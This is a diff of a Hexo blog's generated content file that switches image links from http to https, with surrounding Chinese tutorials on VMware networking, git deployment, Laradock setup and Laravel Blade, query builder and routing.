+<p><img src="https://markdown.yeek.top/bolg/20191030/wlYrcC9BacsH.png?imageslim" alt="mark"></p>
 <p>然后选择 <strong>NAT 模式</strong> ，子网 IP 自己定义</p>
-<p><img src="http://markdown.yeek.top/bolg/20191030/npN7mSyuk7rt.png?imageslim" alt="mark"></p>
+<p><img src="https://markdown.yeek.top/bolg/20191030/npN7mSyuk7rt.png?imageslim" alt="mark"></p>
 <p>进入 <strong>DHCP 设置</strong>，起始 IP 地址 和 结束 IP 地址根据上面的 子网 IP 进行配置</p>
-<p><img src="http://markdown.yeek.top/bolg/20191030/mEiKS3lY8imx.png?imageslim" alt="mark"></p>
+<p><img src="https://markdown.yeek.top/bolg/20191030/mEiKS3lY8imx.png?imageslim" alt="mark"></p>
 <h2 id="Windows-设置"><a href="#Windows-设置" class="headerlink" title="Windows 设置"></a>Windows 设置</h2><p>进入网络连接，如图设置</p>
-<p><img src="http://markdown.yeek.top/bolg/20191030/U71bWtX64Hh3.jpg?imageslim" alt="mark"></p>
+<p><img src="https://markdown.yeek.top/bolg/20191030/U71bWtX64Hh3.jpg?imageslim" alt="mark"></p>
 <h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><ul>
 <li>如果虚拟机没有成功设置，请检查是否选择了 <strong>NAT 模式</strong></li>
 <li>如果虚拟机始终是<strong>169.254.xxx.xxx</strong>，请检查是否与<strong>实体机</strong>或者其他<strong>虚拟机有ip地址冲突</strong></li>
@@ -1017,7 +1017,7 @@
     <url>/post/62693.html</url>
     <content><![CDATA[<p>万万没想到，我重装系统的时候忘记备份 <strong>博客</strong> 文件夹了。之前的18篇文章全部火葬场了。还好之前部署到 <code>GitHub Pages</code> 的文章还在，我只需要重新弄配置文件就可以了。不过难受的是我的第一篇碎碎念忘记备份了，而我又在 <code>hexo g -d</code>  之前 <strong>删掉了仓库</strong>。就在这一系列迷迷糊糊的操作后，我的那篇<strong>客居异乡 4 点钟</strong>写的碎碎念，就这样永远的消失在了互联网。</p>
 <p>以后只能在看到这篇文章的时候才能回忆起那分崩离析的情绪了。</p>
-<p><img src="http://markdown.yeek.top/bolg/20191030/dSBeCgC2f7lV.jpg?imageslim" alt="mark"></p>
+<p><img src="https://markdown.yeek.top/bolg/20191030/dSBeCgC2f7lV.jpg?imageslim" alt="mark"></p>
 <p>摄于写碎碎念时，台风登陆前夕</p>
 ]]></content>
       <categories>
@@ -1127,14 +1127,14 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
 
 <p>将 <strong>home/git/.ssh/id_rsa.pub</strong> 文件的内容复制到 <code>GitHub</code> 上的 <a href="https://github.com/settings/keys" target="_blank" rel="noopener">SSH and GPG keys</a> 中</p>
-<p><img src="http://markdown.yeek.top/20191218224637.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191218224637.png" alt=""></p>
 <p>进入项目目录 <strong>/web/yeek</strong> 添加GitHub的仓库地址，可以尝试一下手动推送</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add github 仓库地址</span><br><span class="line">git push github</span><br></pre></td></tr></table></figure>
 
 
 
 <p>自此，已经完成了以 <code>git</code> 为基础的的自动化更新以及自动推送</p>
-<p><img src="http://markdown.yeek.top/20191218225117.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191218225117.png" alt=""></p>
 ]]></content>
       <categories>
         <category>oam</category>
@@ -1160,7 +1160,7 @@
 
 
 
-<p><img src="http://markdown.yeek.top/20191218001848.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191218001848.png" alt=""></p>
 ]]></content>
       <categories>
         <category>oam</category>
@@ -1326,11 +1326,11 @@
 <li>期间看到红色的不要慌张，都是正常情况</li>
 <li>这里有特别多的<a href="https://mojuchen.github.io/post/16264.html#天坑" target="_blank" rel="noopener">坑</a></li>
 </ol>
-<p><a href="http://markdown.yeek.top/bolg/20191016/6BFgQCKfGjU7.jpg?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191016/6BFgQCKfGjU7.jpg?imageslim" alt="红色不一定是错误"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191016/6BFgQCKfGjU7.jpg?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191016/6BFgQCKfGjU7.jpg?imageslim" alt="红色不一定是错误"></a></p>
 <h3 id="安装完成"><a href="#安装完成" class="headerlink" title="安装完成"></a>安装完成</h3><p>看到这几个容器都 <code>done</code> 则说明 <code>Nginx</code> 和 <code>MySQL</code> 安装完成了</p>
-<p><img src="http://markdown.yeek.top/20191218022119.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191218022119.png" alt=""></p>
 <p>此时访问服务器，返回的应该是 <code>404 Not Found nginx</code></p>
-<p><a href="http://markdown.yeek.top/bolg/20191016/t69uSXfnsrXV.jpg?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191016/t69uSXfnsrXV.jpg?imageslim" alt="404"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191016/t69uSXfnsrXV.jpg?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191016/t69uSXfnsrXV.jpg?imageslim" alt="404"></a></p>
 <p>在 <strong>/web/yeek/public</strong> 下新建一个 <code>index.php</code> ，内容是</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br></pre></td></tr></table></figure>
 
@@ -1347,7 +1347,7 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 要记得先退出 workspace 容器</span></span><br><span class="line">cd /web/yeek</span><br><span class="line">sudo chmod -R 777 storage bootstrap/cache</span><br></pre></td></tr></table></figure>
 
 <p>访问服务器，页面出现 Laravel 的 <strong>欢迎页面</strong></p>
-<p><a href="http://markdown.yeek.top/bolg/20191016/vvWgBqPpcBUw.png?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191016/vvWgBqPpcBUw.png?imageslim" alt="恭喜你安装成功"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191016/vvWgBqPpcBUw.png?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191016/vvWgBqPpcBUw.png?imageslim" alt="恭喜你安装成功"></a></p>
 <h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>在 docker 容器中，容器间的连接需要使用 <strong>容器名</strong> 而不是ip 地址，因此在 <code>.env</code> 中需要将</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DB_HOST&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure>
 
@@ -1420,7 +1420,7 @@
 <p><code>@section</code> 和 <code>@yield</code> 的区别是：</p>
 <p><strong>@section</strong> 标记的重点是<strong>部分</strong></p>
 <p><strong>@yield</strong> 标记的重点是<strong>位置</strong></p>
-<p><a href="http://markdown.yeek.top/bolg/20191010/Hl50d6TFsByh.jpg?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191010/Hl50d6TFsByh.jpg?imageslim" alt="父视图"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191010/Hl50d6TFsByh.jpg?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191010/Hl50d6TFsByh.jpg?imageslim" alt="父视图"></a></p>
 <h3 id="继承布局"><a href="#继承布局" class="headerlink" title="继承布局"></a>继承布局</h3><p>我们创建的是 student 的视图，因此视图的位置是 <em>resource\views*</em>student***<code>section1.blade.php</code> ：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@extends(&#39;layouts&#39;)</span><br><span class="line"></span><br><span class="line">@section(&#39;title&#39;,&#39;Section1&#39;)</span><br><span class="line"></span><br><span class="line">@section(&#39;header&#39;)</span><br><span class="line"></span><br><span class="line">@parent</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;header&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">@endsection</span><br><span class="line"></span><br><span class="line">@section(&#39;content&#39;)</span><br><span class="line">主要</span><br><span class="line">@endsection</span><br><span class="line"></span><br><span class="line">@section(&#39;footer&#39;,&#39;&lt;h1&gt;底部在这里&lt;h1&gt;&#39;)</span><br></pre></td></tr></table></figure>
 
@@ -1433,7 +1433,7 @@
 <p>或者直接在路由中输出视图</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Route::view(&#39;ss&#39;,&#39;student.section1&#39;);</span><br></pre></td></tr></table></figure>
 
-<p><a href="http://markdown.yeek.top/bolg/20191010/FWTrrykRGIHn.jpg?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191010/FWTrrykRGIHn.jpg?imageslim" alt="继承子视图"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191010/FWTrrykRGIHn.jpg?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191010/FWTrrykRGIHn.jpg?imageslim" alt="继承子视图"></a></p>
 <h3 id="Components-amp-Slots"><a href="#Components-amp-Slots" class="headerlink" title="Components &amp; Slots"></a>Components &amp; Slots</h3><p><strong>components</strong> 会主动引用视图，常用于设置复用的部分</p>
 <p><strong>基础使用</strong></p>
 <p>比如有一个会在整个应用中复用的警告，位置在 <em>respurces\views\</em><code>alert.blade.php</code>：</p>
@@ -1445,7 +1445,7 @@
 <p><strong>slot</strong></p>
 <p>由于任何没有被 <code>@slot</code> 指令包裹住的内容将传递给组件中的 <code>$slot</code> 变量：</p>
 <p>显示效果是这样的</p>
-<p><a href="http://markdown.yeek.top/bolg/20191011/ENmfbuDSPpM6.jpg?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191011/ENmfbuDSPpM6.jpg?imageslim" alt="img"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191011/ENmfbuDSPpM6.jpg?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191011/ENmfbuDSPpM6.jpg?imageslim" alt="img"></a></p>
 <p><code>@slot</code> 是用于注入内容到已知的 slot 中，比如我们需要在上面的基础上添加标题：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;alert alert-danger&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;alert-title&quot;&gt;&#123;&#123; $title &#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &#123;&#123; $slot &#125;&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
 
@@ -1453,7 +1453,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@component(&#39;alert&#39;)</span><br><span class="line">@slot(&#39;title&#39;)</span><br><span class="line">Forbidden</span><br><span class="line">@endslot</span><br><span class="line"></span><br><span class="line">You are not allowed to access this resource!</span><br><span class="line">@endcomponent</span><br></pre></td></tr></table></figure>
 
 <p>显示效果</p>
-<p><a href="http://markdown.yeek.top/bolg/20191011/aI7FAQaMxSda.png?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191011/aI7FAQaMxSda.png?imageslim" alt="这样就添加了标题"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191011/aI7FAQaMxSda.png?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191011/aI7FAQaMxSda.png?imageslim" alt="这样就添加了标题"></a></p>
 <p><strong>传递数据</strong></p>
 <p>当然也可以传递数据，首先定义要显示的数据，在上面的基础上添加用户名：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;alert alert-danger&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;alert-title&quot;&gt;&#123;&#123; $title &#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line">    &#123;&#123; $name &#125;&#125; - &#123;&#123; $slot &#125;&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
@@ -1462,7 +1462,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@component(&#39;alert&#39;,[&#39;name&#39;&#x3D;&gt;&#39;moreant&#39;])</span><br><span class="line">@slot(&#39;title&#39;)</span><br><span class="line">Forbidden</span><br><span class="line">@endslot</span><br><span class="line"></span><br><span class="line">You are not allowed to access this resource!</span><br><span class="line">@endcomponent</span><br></pre></td></tr></table></figure>
 
 <p>效果</p>
-<p><a href="http://markdown.yeek.top/bolg/20191011/2THUBnqYH021.png?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191011/2THUBnqYH021.png?imageslim" alt="mark"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191011/2THUBnqYH021.png?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191011/2THUBnqYH021.png?imageslim" alt="mark"></a></p>
 <p><strong>组件别名</strong></p>
 <p>子目录中的 Blade 组件，使用别名访问更方便。现在假设有一个 Blade 组件存储在 <code>resources/views/components/alert.blade.php</code>，可以使用 <code>component</code> 方法给它起个 <code>alert</code> 的别名。通常，在 <code>AppServiceProvider</code> 的 <code>boot</code> 方法中完成这个操作：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use Illuminate\Support\Facades\Blade;</span><br><span class="line"></span><br><span class="line">Blade::component(&#39;components.alert&#39;, &#39;alert&#39;);</span><br></pre></td></tr></table></figure>
@@ -1481,7 +1481,7 @@
 <p>模板是php文件，自然也<strong>能使用php函数</strong>，例如在之前的警告中加入时间</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;alert alert-danger&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;alert-title&quot;&gt;&#123;&#123; $title &#125;&#125; - &#123;&#123; date(&#39;H:i:s&#39;) &#125;&#125; &lt;&#x2F;div&gt;</span><br><span class="line">    &#123;&#123; $slot &#125;&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
 
-<p><a href="http://markdown.yeek.top/bolg/20191011/xa9JBwGNNzIm.png?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191011/xa9JBwGNNzIm.png?imageslim" alt="img"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191011/xa9JBwGNNzIm.png?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191011/xa9JBwGNNzIm.png?imageslim" alt="img"></a></p>
 <p><strong>示未转义数据</strong></p>
 <p>默认情况下，Blade ` {{ }} `语句会自动调用 PHP 的 <code>htmlspecialchars</code> 函数防止 XSS 攻击。不想转义的话，可以使用以下语法：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello, &#123;!! $name !!&#125;.</span><br></pre></td></tr></table></figure>
@@ -1805,11 +1805,11 @@
 <p>返回指定字段：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$student = DB::table(<span class="string">'student'</span>)</span><br><span class="line">    -&gt;pluck(<span class="string">'name'</span>);</span><br></pre></td></tr></table></figure>
 
-<p><a href="http://markdown.yeek.top/bolg/20191007/Rn3hu10dOL71.jpg?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191007/Rn3hu10dOL71.jpg?imageslim" alt="img"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191007/Rn3hu10dOL71.jpg?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191007/Rn3hu10dOL71.jpg?imageslim" alt="img"></a></p>
 <p>自定义键值：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$student = DB::table(<span class="string">'student'</span>)</span><br><span class="line">	-&gt;whereRaw(<span class="string">'id &gt;= ? and age &gt;= ?'</span>,[<span class="number">1004</span>,<span class="number">19</span>])</span><br><span class="line">	-&gt;pluck(<span class="string">'name'</span>,<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure>
 
-<p><a href="http://markdown.yeek.top/bolg/20191007/2teaHlSkVfJv.jpg?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20191007/2teaHlSkVfJv.jpg?imageslim" alt="img"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20191007/2teaHlSkVfJv.jpg?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20191007/2teaHlSkVfJv.jpg?imageslim" alt="img"></a></p>
 <p><strong>select()</strong></p>
 <p>指定返回的字段：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$student = DB::table(<span class="string">'student'</span>)</span><br><span class="line">	-&gt;select(<span class="string">'id'</span>,<span class="string">'name'</span>)</span><br><span class="line">	-&gt;get();</span><br></pre></td></tr></table></figure>
@@ -1952,7 +1952,7 @@
 </ul>
 <h2 id="基本路由"><a href="#基本路由" class="headerlink" title="基本路由"></a>基本路由</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get</span></span><br><span class="line">Route::get(<span class="string">'base1'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello World"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//post</span></span><br><span class="line">Route::post(<span class="string">'base2'</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Base2"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
-<p><a href="http://markdown.yeek.top/bolg/20190924/hL9KC4unbONL.jpg?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20190924/hL9KC4unbONL.jpg?imageslim" alt="mark"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20190924/hL9KC4unbONL.jpg?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20190924/hL9KC4unbONL.jpg?imageslim" alt="mark"></a></p>
 <h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::redirect(<span class="string">'/here'</span>, <span class="string">'/there'</span>, <span class="number">301</span>);</span><br></pre></td></tr></table></figure>
 
 <p>其中 <code>here</code> 表示原路由，<code>there</code> 表示重定向之后的路由，<code>301</code> 是一个 HTTP 状态码，用于标识重定向。</p>
@@ -1980,7 +1980,7 @@
 
 </li>
 </ul>
-<p><a href="http://markdown.yeek.top/bolg/20190924/4JWpT7cVnHUl.jpg?imageslim" target="_blank" rel="noopener"><img src="http://markdown.yeek.top/bolg/20190924/4JWpT7cVnHUl.jpg?imageslim" alt="mark"></a></p>
+<p><a href="https://markdown.yeek.top/bolg/20190924/4JWpT7cVnHUl.jpg?imageslim" target="_blank" rel="noopener"><img src="https://markdown.yeek.top/bolg/20190924/4JWpT7cVnHUl.jpg?imageslim" alt="mark"></a></p>
 <h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p><strong>必选参数</strong>：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">'user/&#123;id&#125;'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"User-id-"</span> . $id;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
